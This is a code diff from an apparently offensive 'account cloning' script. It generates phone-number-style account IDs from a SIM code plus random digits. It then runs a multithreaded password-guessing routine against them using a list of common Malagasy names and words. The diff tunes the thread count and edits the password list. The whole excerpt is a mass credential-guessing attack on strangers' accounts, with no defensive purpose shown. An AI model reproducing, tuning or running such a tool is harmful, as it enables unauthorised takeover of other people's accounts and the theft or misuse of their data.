@@ -108,7 +108,7 @@ def BD_CLONING():
     for nmbr in range(limit):
         nmp=''.join(map(str, generate_random_sequence(7)))
         user.append(nmp)
-    with tred(max_workers=80) as Dipto:
+    with tred(max_workers=60) as Dipto:
         tl=str(len(user))
         print(' TOTAL ACCOUNT : '+tl)
         print(' YOUR SIM CODE : '+code)
@@ -116,7 +116,7 @@ def BD_CLONING():
         linex()
         for psx in user:
             ids=code+psx
-            passlist=[psx,ids,ids[:6],ids[:6],ids[5:],'safidy','Safidy','mahefa','Mahefa','nilaina','Nilaina','valisoa','finoana','fitiavako','rojotiana','solofo','malala','Malala','mamako','Mamako','fitiavana','Fitiavana','nekena','fahendrena','fiderana','fandresena','Nekena','fanantenana','Fanantenana','nirina','Nirina','nantenaina','Nantenaina','tolotra','Tolotra','jesosy','faneva','Jesosy','vadiko','Vadiko','anjara','Anjara','milely','malala','Malala','narovana','Narovana','koloina','Koloina','mamisoa','Mamisoa','narindra','Narindra','sarobidy','sarindra','malagasy','Malagasy','mamiko','mahefa','anjara','lahatra','finoana','fiderana','hasina','nomena','fandresena','lafatra','amboara','tantely','faniry','tolotra','fahendrena','malalako','Faniry','mahery','solofo','faneva','fiderana','Miangola','miangaly','Miangaly','Fiderana','randria','rakotomalala']
+            passlist=[psx,ids,ids[:6],ids[:6],ids[5:],'safidy','mahefa','nilaina','valisoa','seheno','felana','finoana','fitiavako','rojotiana','solofo','malala','mamako','fitiavana','nekena','diamondra','tsilavina','maminirina','tsiafohy','fitahiana','fifaliana','fahendrena','fiderana','fandresena','nekena','fanantenana','nirina','nantenaina','tolotra','jesosy','faneva','vadiko','anjara','milely','malala','narovana','koloina','mamisoa','narindra','sarobidy','sarindra','malagasy','mamiko','lahatra','finoana','fiderana','hasina','nomena','fandresena','lafatra','amboara','tantely','faniry','tolotra','fahendrena','malalako','Faniry','mahery','miangaly','randria','rakotomalala']
             Dipto.submit(method_crack,ids,passlist)
     linex() 
     print(' LE CLONING EST FINI ')
